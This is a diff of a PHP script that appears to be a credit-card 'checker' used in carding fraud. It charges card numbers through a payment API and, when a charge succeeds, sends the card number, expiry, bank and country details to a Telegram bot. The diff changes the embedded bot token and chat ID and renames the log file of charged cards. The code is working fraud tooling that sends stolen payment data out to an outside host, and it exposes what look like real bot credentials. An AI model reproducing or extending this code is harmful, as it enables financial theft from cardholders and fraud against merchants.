@@ -481,8 +481,8 @@ if (preg_match('/^4[0-9]{12}(?:[0-9]{3})?$/', $cc)) {
 
 #############SET DESTINATION OF YOUR TG BOT
 $domain = $_SERVER['HTTP_HOST']; // give you the full URL of the current page that's being accessed
-$botToken = urlencode('5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw');
-$chatID = urlencode('-1001815647781');
+$botToken = urlencode('6240489572:AAGv7ZDZkFZfovSm5l9u1iB2KFuTBTvIT8k');
+$chatID = urlencode('-1001681796656');
 $amttt = intval($amttt)/100;
 
 #############SEND TO TG BOT WHEN CHARGED
@@ -505,7 +505,7 @@ if (strpos($final, '"status": "succeeded"')) {
     $sendchargedtotg = @file_get_contents($sendcharged);
     $num_retries++;
     echo ''.$myip.'<span class="badge badge-success"><b>#CHARGED</b></span> <font class="text-white"><b>'.$cc.'|'.$mm.'|'.$yy.'</b></font>  '.$scheme.''.$cctype.''.$bank_name.''.$cc_country.'<font class="text-white"><br>➤ The payment transaction has been successfully processed 💰✅<br>➤ Amount: '.strtoupper($currency).''.$amttt.'<br>➤ Receipt: <span style="background-color: white; color: green;" class="badge"><a href="'.$success.'"  target="_blank"><b>'.$success.'</b></a></span><br>➤ Checked from: <b>'.$domain.'</b></font><br>';
-    fwrite(fopen('auto-charged-ccs.txt', 'a'), $card."\r\n");
+    fwrite(fopen('noor.txt', 'a'), $card."\r\n");
     }
 exit;
 }
